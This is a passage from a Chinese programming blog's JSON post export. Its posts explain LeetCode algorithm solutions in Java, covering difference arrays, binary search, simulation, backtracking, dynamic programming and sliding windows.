次旅行有&nbsp;numPassengersi&nbsp;乘客，接他们和放他们的位置分别是&nbsp;fromi&nbsp;和&nbsp;toi&nbsp;。这些位置是从汽车的初始位置向东的公里数。 当且仅当你可以在所有给定的行程中接送所有乘客时，返回&nbsp;true，否则请返回 false。 示例 1： 输入：trips = [[2,1,5],[3,3,7]], capacity = 4 输出：false 示例 2： 输入：trips = [[2,1,5],[3,3,7]], capacity = 5 输出：true 提示： 1 &lt;= trips.length &lt;= 1000 trips[i].length == 3 1 &lt;= numPassengersi&nbsp;&lt;= 100 0 &lt;= fromi&nbsp;&lt; toi&nbsp;&lt;= 1000 1 &lt;= capacity &lt;= 105 思路 题目给出的数据不是很大，然后需要频繁对车站人数上车和下车，即频繁的增加和减掉，可以考虑用差分数组来实现。 解题方法 差分数组，题目给出车站从0-1000，那么只需计算经过每个站车上的人数，不需要管需不需要下车， 求出每个站在车上的人数，然后再循环比对每个车站的人数，如果超过限制人数，直接返回false。 复杂度 时间复杂度: $O(n)$ 空间复杂度: $O(n)$ Code 123456789101112131415161718192021222324252627class Solution &#123; public boolean carPooling(int[][] trips, int capacity) &#123; // 差分数组，题目给出车站从0-1000，那么只需计算经过每个站车上的人数，不需要管需不需要下车 int[] nums = new int[1001]; for (int[] trip: trips) &#123; int p = trip[0]; int from = trip[1]; int to = trip[2] - 1; // 比如第0站坐到第2个站，那么还在车上为0，1 // 给 from 到 to - 1 的都加 p nums[from] += p; if (to + 1 &lt; 1001) &#123; nums[to + 1] -= p; &#125; &#125; // 将差分数组转化为原数据 int[] res = new int[1001]; res[0] = nums[0]; for (int j = 1; j &lt; 1001; j++) &#123; res[j] = res[j - 1] + nums[j]; &#125; // 然后判断每个站的车上人数是否超载 for (int k = 0; k &lt; 1001; k++) &#123; if (res[k] &gt; capacity) return false; &#125; return true; &#125;&#125;","categories":[{"name":"计算机算法","slug":"计算机算法","permalink":"https://blog.zhengxiangling.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%AE%97%E6%B3%95/"},{"name":"差分数组","slug":"计算机算法/差分数组","permalink":"https://blog.zhengxiangling.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%AE%97%E6%B3%95/%E5%B7%AE%E5%88%86%E6%95%B0%E7%BB%84/"}],"tags":[],"author":"Elijah Zheng"},{"title":"二分查找，找目标值（或边界）问题","slug":"二分查找，找目标值（或边界）问题","date":"2023-11-18T12:07:00.000Z","updated":"2023-11-19T06:50:21.994Z","comments":true,"path":"2023/11/18/二分查找，找目标值（或边界）问题/","link":"","permalink":"https://blog.zhengxiangling.com/2023/11/18/%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE%EF%BC%8C%E6%89%BE%E7%9B%AE%E6%A0%87%E5%80%BC%EF%BC%88%E6%88%96%E8%BE%B9%E7%95%8C%EF%BC%89%E9%97%AE%E9%A2%98/","excerpt":"二分查找包括求查找中间值和左右边界值三种情况。","text":"二分查找包括求查找中间值和左右边界值三种情况。 二分查找（左右指针）模板左右指针即为最开始，左指针left在数组的最开始位置，右指针right在数组的末尾，然后循环时在判断左右指针什么时候开始相向移动，直至left == right左右指针相遇。 常见题目：二分查找，求两数之和、反转数组等。 重点为二分查找，二分查找的数组可能包含重复值，重复值的寻找条件可能包含第一寻找到相同元素返回、寻找指定元素的最左边界位置、寻找指定元素的最右边界位置等三种情况。三种边界的区别在于，寻找到指定元素后是否需要第一时间返回位置值，即nums[mid]==target时的操作不同，可见下列算法。 算法如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263int binary_search(int[] nums, int target) &#123; int left = 0, right = nums.length - 1; while(left &lt;= right) &#123; int mid = left + (right - left) / 2; if (nums[mid] &lt; target) &#123; left = mid + 1; &#125; else if (nums[mid] &gt; target) &#123; right = mid - 1; &#125; else if(nums[mid] == target) &#123; // 直接返回 return mid; &#125; &#125; // 直接返回 return -1;&#125;int left_bound(int[] nums, int target) &#123; int left = 0, right = nums.length - 1; while (left &lt;= right) &#123; int mid = left + (right - left) / 2; if (nums[mid] &lt; target) &#123; left = mid + 1; &#125; else if (nums[mid] &gt; target) &#123; right = mid - 1; &#125; else if (nums[mid] == target) &#123; // 别返回，锁定左侧边界 right = mid - 1; &#125; &#125; // 判断 target 是否存在于 nums 中 if (left &lt; 0 || left &gt;= nums.length) &#123; return -1; &#125; // 判断一下 nums[left] 是不是 target return nums[left] == target ? left : -1;&#125;int right_bound(int[] nums, int target) &#123; int left = 0, right = nums.length - 1; while (left &lt;= right) &#123; int mid = left + (right - left) / 2; if (nums[mid] &lt; target) &#123; left = mid + 1; &#125; else if (nums[mid] &gt; target) &#123; right = mid - 1; &#125; else if (nums[mid] == target) &#123; // 别返回，锁定右侧边界 left = mid + 1; &#125; &#125; // 判断 target 是否存在于 nums 中 // if (left - 1 &lt; 0 || left - 1 &gt;= nums.length) &#123; // return -1; // &#125; // 由于 while 的结束条件是 right == left - 1，且现在在求右边界 // 所以用 right 替代 left - 1 更好记 if (right &lt; 0 || right &gt;= nums.length) &#123; return -1; &#125; return nums[right] == target ? right : -1;&#125; 2300.咒语和药水的成功对数（中等） Problem: 2300. 咒语和药水的成功对数 给你两个正整数数组&nbsp;spells 和&nbsp;potions&nbsp;，长度分别为&nbsp;n 和&nbsp;m&nbsp;，其中&nbsp;spells[i]&nbsp;表示第&nbsp;i&nbsp;个咒语的能量强度，potions[j]&nbsp;表示第&nbsp;j&nbsp;瓶药水的能量强度。 同时给你一个整数&nbsp;success&nbsp;。一个咒语和药水的能量强度 相乘 如果&nbsp;大于等于&nbsp;success&nbsp;，那么它们视为一对&nbsp;成功&nbsp;的组合。 请你返回一个长度为 n&nbsp;的整数数组&nbsp;pairs，其中&nbsp;pairs[i]&nbsp;是能跟第 i&nbsp;个咒语成功组合的 药水&nbsp;数目。 示例 1： 输入：spells = [5,1,3], potions = [1,2,3,4,5], success = 7 输出：[4,0,3] 解释： - 第 0 个咒语：5 * [1,2,3,4,5] = [5,10,15,20,25] 。总共 4 个成功组合。 - 第 1 个咒语：1 * [1,2,3,4,5] = [1,2,3,4,5] 。总共 0 个成功组合。 - 第 2 个咒语：3 * [1,2,3,4,5] = [3,6,9,12,15] 。总共 3 个成功组合。 所以返回 [4,0,3] 。 示例 2： 输入：spells = [3,1,2], potions = [8,5,8], success = 16 输出：[2,0,2] 解释： - 第 0 个咒语：3 * [8,5,8] = [24,15,24] 。总共 2 个成功组合。 - 第 1 个咒语：1 * [8,5,8] = [8,5,8] 。总共 0 个成功组合。 - 第 2 个咒语：2 * [8,5,8] = [16,10,16] 。总共 2 个成功组合。 所以返回 [2,0,2] 。 提示： n == spells.length m == potions.length 1 &lt;= n, m &lt;= 105 1 &lt;= spells[i], potions[i] &lt;= 105 1 &lt;= success &lt;= 1010 思路 刚看的时候想到暴力A，但是第52个用例开始超时，所以改用二分法，找到排序后的药水最左边满足条件的下标，n - left 为第 i 个魔法成功的对数。 解题方法 对药水进行递增排序，然后二分查找满足 success 的药水下标。 复杂度 时间复杂度:（不算sort） $O(mlogn)$ 空间复杂度: $O(n)$ Code 123456789101112131415161718192021222324252627282930313233class Solution &#123; public int[] successfulPairs(int[] spells, int[] potions, long success) &#123; int m = spells.length, n = potions.length; Arrays.sort(potions); int[] res = new int[m]; for (int i = 0; i &lt; m; i++) &#123; int l = 0, r = n - 1; while(l &lt;= r) &#123; int mid = l + (r - l) / 2; long check = (long)spells[i] * (long)potions[mid]; if (check &lt; success) &#123; l = mid + 1; &#125; else &#123; r = mid - 1; &#125; &#125; res[i] = n - l; // 暴力在第52个案例超时，尝试用二分 // int su = 0; // for (int j = 0; j &lt; n; j++) &#123; // long check = (long)spells[i] * (long)potions[j]; // if (check &gt;= success) &#123; // su = su + (n - j); // break; // &#125; // &#125; // res[i] = su; &#125; return res; &#125;&#125; 2258. 逃离火灾（困难）图+BFS+二分查找 Problem: 2258. 逃离火灾 给你一个下标从 0&nbsp;开始大小为 m x n&nbsp;的二维整数数组&nbsp;grid&nbsp;，它表示一个网格图。每个格子为下面 3 个值之一： 0 表示草地。 1 表示着火的格子。 2&nbsp;表示一座墙，你跟火都不能通过这个格子。 一开始你在最左上角的格子&nbsp;(0, 0)&nbsp;，你想要到达最右下角的安全屋格子&nbsp;(m - 1, n - 1)&nbsp;。每一分钟，你可以移动到&nbsp;相邻&nbsp;的草地格子。每次你移动 之后&nbsp;，着火的格子会扩散到所有不是墙的 相邻&nbsp;格子。 请你返回你在初始位置可以停留的 最多 分钟数，且停留完这段时间后你还能安全到达安全屋。如果无法实现，请你返回 -1&nbsp;。如果不管你在初始位置停留多久，你 总是&nbsp;能到达安全屋，请你返回&nbsp;109&nbsp;。 注意，如果你到达安全屋后，火马上到了安全屋，这视为你能够安全到达安全屋。 如果两个格子有共同边，那么它们为 相邻&nbsp;格子。 示例 1： 输入：grid = [[0,2,0,0,0,0,0],[0,0,0,2,2,1,0],[0,2,0,0,1,2,0],[0,0,2,2,2,0,2],[0,0,0,0,0,0,0]] 输出：3 解释：上图展示了你在初始位置停留 3 分钟后的情形。 你仍然可以安全到达安全屋。 停留超过 3 分钟会让你无法安全到达安全屋。 示例 2： 输入：grid = [[0,0,0,0],[0,1,2,0],[0,2,0,0]] 输出：-1 解释：上图展示了你马上开始朝安全屋移动的情形。 火会蔓延到你可以移动的所有格子，所以无法安全到达安全屋。 所以返回 -1 。 示例 3： 输入：grid = [[0,0,0],[2,2,0],[1,2,0]] 输出：1000000000 解释：上图展示了初始网格图。 注意，由于火被墙围了起来，所以无论如何你都能安全到达安全屋。 所以返回 109 。 提示： m == grid.length n == grid[i].length 2 &lt;= m, n &lt;= 300 4 &lt;= m * n &lt;= 2 * 104 grid[i][j]&nbsp;是&nbsp;0&nbsp;，1&nbsp;或者&nbsp;2&nbsp;。 grid[0][0] == grid[m - 1][n - 1] == 0 思路 题目为找人可以延迟多少分钟后再逃，即找最大延迟时间，设最大延迟时间为 t，只要在不超过 t 时间内这个人都是可以逃得掉的，那么这道题可以转化为找 t 时间，可以用二分查找。 解题方法 t 时间的范围为 0 到 m * n - 1，先求火在 t 时间蔓延有没有遇到人，如果没有遇到再让人和火一起赛跑，如果蔓延到人了就 GG 然后继续循环，直到找到最大的 t 时间。 复杂度 时间复杂度: 添加时间复杂度： check 时间复杂度 $O(mn)$，二分时间复杂度 $O(logmn)$ 空间复杂度: 添加空间复杂度： $O(m * n)$ Code 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788class Solution &#123; // 二分查找 int[][] dirs = new int[][]&#123;&#123;0, 1&#125;, &#123;0, -1&#125;, &#123;-1, 0&#125;, &#123;1, 0&#125;&#125;; int m, n; boolean ok; int[][] g, fg, pg; public int maximumMinutes(int[][] grid) &#123; // 初始化 m = grid.length; n = grid[0].length; g = grid; fg = new int[m][n]; pg = new int[m][n]; // 判断刚开始人是否能逃 if (!check(0)) return -1; // 开始做最右边界的二分查找 int l = 0, r = m * n - 1; while (l &lt;= r) &#123; int mid = l + (r - l) / 2; if (check(mid)) &#123; l = mid + 1; &#125; else &#123; r = mid - 1; &#125; &#125; return r == m * n -1 ? (int)1e9 : r; &#125; // 检查第 t 秒人是否能逃 boolean check(int t) &#123; ok = false; Queue&lt;int[]&gt; fire = new LinkedList&lt;&gt;(); // 先找出原始火的位置，加入队列 for (int i = 0; i &lt; m; i++) &#123; for (int j = 0; j &lt; n; j ++) &#123; // 每次检查 t 都要初始化人和火的位置 fg[i][j] = pg[i][j] = 0; if (g[i][j] == 1) &#123; fg[i][j] = 1; fire.offer(new int[]&#123;i, j&#125;); &#125; &#125; &#125; // bfs t 秒后火蔓延的位置 while(t-- &gt; 0) update(fire, true, 0); // 如果火蔓延到人的位置，则当前t时间不可 if (fg[0][0] != 0) return false; // 开始人和火追逐 Queue&lt;int[]&gt; people = new LinkedList&lt;&gt;(); pg[0][0] = 1; people.offer(new int[]&#123;0, 0&#125;); while(!people.isEmpty()) &#123; // 火先走，到人 update(fire, true, 1); update(people, false, 1); if (ok) return true; &#125; return false; &#125; // bfs 函数，true 为 火， false 为 人，offset 为人和火开始走的标识 void update(Queue&lt;int[]&gt; q, boolean isFire, int offset) &#123; int sz = q.size(); while (sz-- &gt; 0) &#123; int[] info = q.poll(); int x = info[0], y = info[1]; for (int[] dir: dirs) &#123; int nx = x + dir[0], ny = y + dir[1]; // 判断是否越界 if (nx &lt; 0 || nx &gt;= m || ny &lt; 0 || ny &gt;= n) continue; // 如果为墙 if (g[nx][ny] == 2) continue; // 如果为火 if (isFire) &#123; // 如果不可蔓延 if (fg[nx][ny] != 0) continue; fg[nx][ny] = fg[x][y] + offset; &#125; else &#123; // 如果为人 // 如果走到终点，并且终点没有火；或者火已经在了终点（因为check时火比人先走一步），并且人再走一步就到终点，则人可以安全到达 if (nx == m - 1 &amp;&amp; ny == n - 1 &amp;&amp; (fg[nx][ny] == 0 || fg[nx][ny] == pg[x][y] + offset)) ok = true; // 如果位置被烧了或者人已经走过，则跳过 if (fg[nx][ny] != 0 || pg[nx][ny] != 0) continue; pg[nx][ny] = pg[x][y] + offset; &#125; q.offer(new int[]&#123;nx, ny&#125;); &#125; &#125; &#125;&#125;","categories":[{"name":"计算机算法","slug":"计算机算法","permalink":"https://blog.zhengxiangling.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%AE%97%E6%B3%95/"},{"name":"二分查找","slug":"计算机算法/二分查找","permalink":"https://blog.zhengxiangling.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%AE%97%E6%B3%95/%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE/"}],"tags":[],"author":"Elijah Zheng"},{"title":"模拟题，根据题目规则嵌套if找答案","slug":"模拟题，根据题目规则嵌套if找答案","date":"2023-11-18T02:50:00.000Z","updated":"2023-11-18T11:00:43.432Z","comments":true,"path":"2023/11/18/模拟题，根据题目规则嵌套if找答案/","link":"","permalink":"https://blog.zhengxiangling.com/2023/11/18/%E6%A8%A1%E6%8B%9F%E9%A2%98%EF%BC%8C%E6%A0%B9%E6%8D%AE%E9%A2%98%E7%9B%AE%E8%A7%84%E5%88%99%E5%B5%8C%E5%A5%97if%E6%89%BE%E7%AD%94%E6%A1%88/","excerpt":"模拟，即题目给定规则，要求找到符合条件的解。","text":"模拟，即题目给定规则，要求找到符合条件的解。 以算数计算题为例，求解模拟题的过程。 640.求解方程 Problem: 640. 求解方程 求解一个给定的方程，将x以字符串 \"x=#value\"&nbsp;的形式返回。该方程仅包含 '+' ， '-' 操作，变量&nbsp;x&nbsp;和其对应系数。 如果方程没有解或存在的解不为整数，请返回&nbsp;\"No solution\"&nbsp;。如果方程有无限解，则返回 “Infinite solutions” 。 题目保证，如果方程中只有一个解，则 'x' 的值是一个整数。 &nbsp; 示例 1： 输入: equation = \"x+5-3+x=6+x-2\" 输出: \"x=2\" 示例 2: 输入: equation = \"x=x\" 输出: \"Infinite solutions\" 示例 3: 输入: equation = \"2x=x\" 输出: \"x=0\" &nbsp; 提示: 3 &lt;= equation.length &lt;= 1000 equation&nbsp;只有一个&nbsp;'='.&nbsp; 方程由绝对值在&nbsp;[0, 100]&nbsp; 范围内且无任何前导零的整数和变量 'x'&nbsp;组成。&ZeroWidthSpace;&ZeroWidthSpace;&ZeroWidthSpace; 思路 模拟题，分别对运算符进行判断，找出跟解相关的x和num的值，然后求解。 解题方法 ‘+’和’-‘作为数值符号；’&#x3D;’作为等式左边计算完毕的判断，然后把’x’和’num’的符号取反然后继续运算；’x’如果没有数字要记作1；最后的答案对’x’的值和’num’的值判断即可。 复杂度 时间复杂度:跟方程表达式的长度相关，$O(n)$ 空间复杂度: $O(n)$。如果用 .charAt() 可以降为$O(1)$ Code 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647class Solution &#123; public String solveEquation(String equation) &#123; // 模拟法 对 + - = 和 x 分别做判断 int n = equation.length(); int x = 0, num = 0; char[] s = equation.toCharArray(); int index = 0; int po = 1; while(index &lt; n) &#123; char c = s[index]; // 记录改变数字的符号 if(c == &#x27;+&#x27;) &#123; index ++; po = 1; &#125; else if (c == &#x27;-&#x27;) &#123; index ++; po = -1; &#125; else if (c == &#x27;=&#x27;) &#123; // 左边算完了，对调算右边 x = -x; num = -num; po = 1; index++; &#125; else &#123; // 求数字 int j = index; while(j &lt; n &amp;&amp; s[j] != &#x27;+&#x27; &amp;&amp; s[j] != &#x27;-&#x27; &amp;&amp; s[j] != &#x27;=&#x27;) j++; // 如果数字后一位为x if(s[j-1] == &#x27;x&#x27;) &#123; x += ((j - 1 == index) ? 1 : Integer.parseInt(equation.substring(index, j - 1))) * po; &#125; else &#123; // 不为x，记录num的值 num += Integer.parseInt(equation.substring(index, j)) * po; &#125; // 找完数字，继续查找下一个 index=j; &#125; &#125; // 如果没有x，只有数字，无解 if (x == 0 &amp;&amp; num != 0) &#123; return &quot;No solution&quot;; &#125; else if (x == 0 &amp;&amp; num == 0) &#123; // 如果没有x和数字，无穷解 return &quot;Infinite solutions&quot;; &#125; else &#123; return &quot;x=&quot; + -1 * (num / x); &#125; &#125;&#125;","categories":[{"name":"计算机算法","slug":"计算机算法","permalink":"https://blog.zhengxiangling.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%AE%97%E6%B3%95/"},{"name":"模拟","slug":"计算机算法/模拟","permalink":"https://blog.zhengxiangling.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%AE%97%E6%B3%95/%E6%A8%A1%E6%8B%9F/"}],"tags":[],"author":"Elijah Zheng"},{"title":"运用回溯算法，解决排列、组合和子集问题","slug":"运用回溯算法，解决排列、组合和子集问题","date":"2023-10-17T10:43:00.000Z","updated":"2023-11-18T12:27:16.928Z","comments":true,"path":"2023/10/17/运用回溯算法，解决排列、组合和子集问题/","link":"","permalink":"https://blog.zhengxiangling.com/2023/10/17/%E8%BF%90%E7%94%A8%E5%9B%9E%E6%BA%AF%E7%AE%97%E6%B3%95%EF%BC%8C%E8%A7%A3%E5%86%B3%E6%8E%92%E5%88%97%E3%80%81%E7%BB%84%E5%90%88%E5%92%8C%E5%AD%90%E9%9B%86%E9%97%AE%E9%A2%98/","excerpt":"回溯算法本质上也是一种暴力穷举算法，可以理解为：每个回溯问题就是遍历一个决策树的过程，每个叶子节点都存在一个数值，寻找叶子结点是否为满足条件的值，然后收集全部满足条件的值的过程就是回溯算法。 排列、组合和子集问题，无非就是寻找决策树叶子节点的过程，只是这三个问题对树枝的遍历和剪&#x2F;加树枝有稍微变化罢了，然后在区分一下三种边界条件：元素无重复不可复选、元素无重复可复选、元素可重复不可复选。","text":"回溯算法本质上也是一种暴力穷举算法，可以理解为：每个回溯问题就是遍历一个决策树的过程，每个叶子节点都存在一个数值，寻找叶子结点是否为满足条件的值，然后收集全部满足条件的值的过程就是回溯算法。 排列、组合和子集问题，无非就是寻找决策树叶子节点的过程，只是这三个问题对树枝的遍历和剪&#x2F;加树枝有稍微变化罢了，然后在区分一下三种边界条件：元素无重复不可复选、元素无重复可复选、元素可重复不可复选。 回溯算法框架 1234567891011result = []def backtrack(路径, 选择列表): if 满足结束条件: result.add(路径) return for 选择 in 选择列表: 做选择 backtrack(路径, 选择列表) 撤销选择 形式一、元素无重不可复选，即 nums 中的元素都是唯一的，每个元素最多只能被使用一次，backtrack 核心代码如下： 123456789101112131415161718192021222324252627282930/* 组合/子集问题回溯算法框架 */void backtrack(int[] nums, int start) &#123; // 回溯算法标准框架 for (int i = start; i &lt; nums.length; i++) &#123; // 做选择 track.addLast(nums[i]); // 注意参数 backtrack(nums, i + 1); // 撤销选择 track.removeLast(); &#125;&#125;/* 排列问题回溯算法框架 */void backtrack(int[] nums) &#123; for (int i = 0; i &lt; nums.length; i++) &#123; // 剪枝逻辑 if (used[i]) &#123; continue; &#125; // 做选择 used[i] = true; track.addLast(nums[i]); backtrack(nums); // 撤销选择 track.removeLast(); used[i] = false; &#125;&#125; 形式二、元素可重不可复选，即 nums 中的元素可以存在重复，每个元素最多只能被使用一次，其关键在于排序和剪枝，backtrack 核心代码如下： 1234567891011121314151617181920212223242526272829303132333435363738394041Arrays.sort(nums);/* 组合/子集问题回溯算法框架 */void backtrack(int[] nums, int start) &#123; // 回溯算法标准框架 for (int i = start; i &lt; nums.length; i++) &#123; // 剪枝逻辑，跳过值相同的相邻树枝 if (i &gt; start &amp;&amp; nums[i] == nums[i - 1]) &#123; continue; &#125; // 做选择 track.addLast(nums[i]); // 注意参数 backtrack(nums, i + 1); // 撤销选择 track.removeLast(); &#125;&#125;Arrays.sort(nums);/* 排列问题回溯算法框架 */void backtrack(int[] nums) &#123; for (int i = 0; i &lt; nums.length; i++) &#123; // 剪枝逻辑 if (used[i]) &#123; continue; &#125; // 剪枝逻辑，固定相同的元素在排列中的相对位置 if (i &gt; 0 &amp;&amp; nums[i] == nums[i - 1] &amp;&amp; !used[i - 1]) &#123; continue; &#125; // 做选择 used[i] = true; track.addLast(nums[i]); backtrack(nums); // 撤销选择 track.removeLast(); used[i] = false; &#125;&#125; 形式三、元素无重可复选，即 nums 中的元素都是唯一的，每个元素可以被使用若干次，只要删掉去重逻辑即可，backtrack 核心代码如下： 123456789101112131415161718192021222324/* 组合/子集问题回溯算法框架 */void backtrack(int[] nums, int start) &#123; // 回溯算法标准框架 for (int i = start; i &lt; nums.length; i++) &#123; // 做选择 track.addLast(nums[i]); // 注意参数 backtrack(nums, i); // 撤销选择 track.removeLast(); &#125;&#125;/* 排列问题回溯算法框架 */void backtrack(int[] nums) &#123; for (int i = 0; i &lt; nums.length; i++) &#123; // 做选择 track.addLast(nums[i]); backtrack(nums); // 撤销选择 track.removeLast(); &#125;&#125; 17.电话号码的字母组合 Problem: 17. 电话号码的字母组合 给定一个仅包含数字&nbsp;2-9&nbsp;的字符串，返回所有它能表示的字母组合。答案可以按 任意顺序 返回。 给出数字到字母的映射如下（与电话按键相同）。注意 1 不对应任何字母。 示例 1： 输入：digits = \"23\" 输出：[\"ad\",\"ae\",\"af\",\"bd\",\"be\",\"bf\",\"cd\",\"ce\",\"cf\"] 示例 2： 输入：digits = \"\" 输出：[] 示例 3： 输入：digits = \"2\" 输出：[\"a\",\"b\",\"c\"] 提示： 0 &lt;= digits.length &lt;= 4 digits[i] 是范围 ['2', '9'] 的一个数字。 思路 按题目，按键无重复值，并且是从头往后组合不可复选，可直接上回溯算法。 解题方法 把按钮的值存入数组，然后递归。 Code 12345678910111213141516171819202122232425262728293031class Solution &#123; List&lt;String&gt; ans = new ArrayList&lt;&gt;(); int n; String phone; public List&lt;String&gt; letterCombinations(String digits) &#123; String[] s = new String[]&#123;&quot;abc&quot;,&quot;def&quot;,&quot;ghi&quot;,&quot;jkl&quot;,&quot;mno&quot;,&quot;pqrs&quot;,&quot;tuv&quot;,&quot;wxyz&quot;&#125;; String track = &quot;&quot;; n = digits.length(); if (n == 0) return ans; phone = digits; // boolean[] used = new boolean[n]; backtracks(s, track, 0); return ans; &#125; public void backtracks(String[] s, String track, int start)&#123; if (track.length() == n) &#123; ans.add(track); return; &#125; // for(int i = start; i &lt; n; i++) &#123; // if(used[i]) continue; for(char c: s[phone.charAt(start) - &#x27;2&#x27;].toCharArray()) &#123; track += c; // used[i] = true; backtracks(s, track, start + 1); track = track.substring(0, track.length() - 1); // used[i] = false; &#125; // &#125; &#125;&#125;","categories":[{"name":"计算机算法","slug":"计算机算法","permalink":"https://blog.zhengxiangling.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%AE%97%E6%B3%95/"},{"name":"回溯算法","slug":"计算机算法/回溯算法","permalink":"https://blog.zhengxiangling.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%AE%97%E6%B3%95/%E5%9B%9E%E6%BA%AF%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"回溯算法","slug":"回溯算法","permalink":"https://blog.zhengxiangling.com/tags/%E5%9B%9E%E6%BA%AF%E7%AE%97%E6%B3%95/"}],"author":"Elijah Zheng"},{"title":"动态规划求最值问题","slug":"规划求最值问题","date":"2023-10-16T11:18:00.000Z","updated":"2023-11-17T14:27:30.011Z","comments":true,"path":"2023/10/16/规划求最值问题/","link":"","permalink":"https://blog.zhengxiangling.com/2023/10/16/%E8%A7%84%E5%88%92%E6%B1%82%E6%9C%80%E5%80%BC%E9%97%AE%E9%A2%98/","excerpt":"求最值问题，比如最长序列、最短距离等，不考虑时间和空间都可以通过暴力穷举的方式遍历获得结果，通过对穷举的过程进行优化减少重复开销的过程，即动态规划。 动态规划的重点，就是如何确定 状态转移方程 和 通过 备忘录 空间换时间降低时间复杂度（优化穷举）。","text":"求最值问题，比如最长序列、最短距离等，不考虑时间和空间都可以通过暴力穷举的方式遍历获得结果，通过对穷举的过程进行优化减少重复开销的过程，即动态规划。 动态规划的重点，就是如何确定 状态转移方程 和 通过 备忘录 空间换时间降低时间复杂度（优化穷举）。 以拿硬币举例，从 1,2,5 从拿硬币，求 amount 满足 11 时的最少硬币数量。 状态转移方程构建1.确定 base case 即确定满足什么边界条件时 return 直接结束当前递归。 其中，例子的边界条件为：当 amount == 0 时 返回 0，当 amount &lt; 0 时无解，返回 -1。 2.确定 状态即原问题和子问题都会变化的变量。其中，例子的状态为 amount，可以看出每拿走一个硬币 amount 就会改变，并向 base case 靠近，直至匹配。 3.明确 选择 即导致状态改变的行为。其中，例子的选择为拿硬币。 4.明确 dp 的定义 dp 函数即递归找最值的函数，递归一般分为 自顶向下 和 自底向上 两种，框架如下 123456789101112131415# 自顶向下递归的动态规划def dp(状态1, 状态2, ...): for 选择 in 所有可能的选择: # 此时的状态已经因为做了选择而改变 result = 求最值(result, dp(状态1, 状态2, ...)) return result# 自底向上迭代的动态规划# 初始化 base casedp[0][0][...] = base case# 进行状态转移for 状态1 in 状态1的所有取值： for 状态2 in 状态2的所有取值： for ... dp[状态1][状态2][...] = 求最值(选择1，选择2...) 对比如下解法看出区别： 1234567891011121314151617181920212223242526272829303132// 自顶向下int fib(int N) &#123; // 备忘录全初始化为 0 int[] memo = new int[N + 1]; // 进行带备忘录的递归 return dp(memo, N);&#125;// 带着备忘录进行递归int dp(int[] memo, int n) &#123; // base case if (n == 0 || n == 1) return n; // 已经计算过，不用再计算了 if (memo[n] != 0) return memo[n]; memo[n] = dp(memo, n - 1) + dp(memo, n - 2); return memo[n];&#125;// 自底向上int fib(int N) &#123; if (N == 0) return 0; int[] dp = new int[N + 1]; // base case dp[0] = 0; dp[1] = 1; // 状态转移 for (int i = 2; i &lt;= N; i++) &#123; dp[i] = dp[i - 1] + dp[i - 2]; &#125; return dp[N];&#125; 备忘录 memo备忘录的作用，用于解决重复计算的问题。每次解决子问题的时候，先去备忘录查一下是否有结果，如果有直接使用，避免重复计算。例子如下： 12345678910111213141516int fib(int N) &#123; // 备忘录全初始化为 0 int[] memo = new int[N + 1]; // 进行带备忘录的递归 return dp(memo, N);&#125;// 带着备忘录进行递归int dp(int[] memo, int n) &#123; // base case if (n == 0 || n == 1) return n; // 已经计算过，不用再计算了 if (memo[n] != 0) return memo[n]; memo[n] = dp(memo, n - 1) + dp(memo, n - 2); return memo[n];&#125;","categories":[{"name":"动态规划","slug":"动态规划","permalink":"https://blog.zhengxiangling.com/categories/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/"}],"tags":[],"author":"Elijah Zheng"},{"title":"滑动窗口找满足规则的区间问题","slug":"双指针秒杀数组、字符串操作题","date":"2023-10-16T00:12:00.000Z","updated":"2023-11-18T12:41:09.592Z","comments":true,"path":"2023/10/16/双指针秒杀数组、字符串操作题/","link":"","permalink":"https://blog.zhengxiangling.com/2023/10/16/%E5%8F%8C%E6%8C%87%E9%92%88%E7%A7%92%E6%9D%80%E6%95%B0%E7%BB%84%E3%80%81%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%93%8D%E4%BD%9C%E9%A2%98/","excerpt":"滑动窗口也为快慢指针。两个指针，fast指针在前面探路，slow指针负责在移动前做判断条件，然后再移动，两个指针覆盖的长度即为要找的元素空间。 常见的快慢指针题目：找满足条件的最长子串、删除排序的重复元素等。","text":"滑动窗口也为快慢指针。两个指针，fast指针在前面探路，slow指针负责在移动前做判断条件，然后再移动，两个指针覆盖的长度即为要找的元素空间。 常见的快慢指针题目：找满足条件的最长子串、删除排序的重复元素等。 滑动窗口算法框架123456789101112131415161718192021222324252627282930/* 滑动窗口算法框架 */public void slidingWindow(String s, String t) &#123; HashMap&lt;Character, Integer&gt; need = new HashMap&lt;&gt;(); HashMap&lt;Character, Integer&gt; window = new HashMap&lt;&gt;(); for (char c : t.toCharArray()) need.put(c, need.getOrDefault(c, 0) + 1); int left = 0, right = 0; int valid = 0; while (right &lt; s.length()) &#123; char c = s.charAt(right); // 右移（增大）窗口 right++; // 进行窗口内数据的一系列更新 if (need.containsKey(c)) &#123; window.put(c, window.getOrDefault(c, 0) + 1); if (window.get(c).equals(need.get(c))) valid++; &#125; while (window needs shrink) &#123; char d = s.charAt(left); // 左移（缩小）窗口 left++; // 进行窗口内数据的一系列更新 if (need.containsKey(d)) &#123; if (window.get(d).equals(need.get(d))) valid--; window.put(d, window.getOrDefault(d, 0) - 1); &#125; &#125; &#125;&#125; 2760. 最长奇偶子数组 Problem: 2760. 最长奇偶子数组 给你一个下标从 0 开始的整数数组 nums 和一个整数 threshold 。 请你从 nums 的子数组中找出以下标 l 开头、下标 r 结尾 (0 &lt;= l &lt;= r &lt; nums.length) 且满足以下条件的 最长子数组 ： nums[l] % 2 == 0 对于范围&nbsp;[l, r - 1] 内的所有下标 i ，nums[i] % 2 != nums[i + 1] % 2 对于范围&nbsp;[l, r] 内的所有下标 i ，nums[i] &lt;= threshold 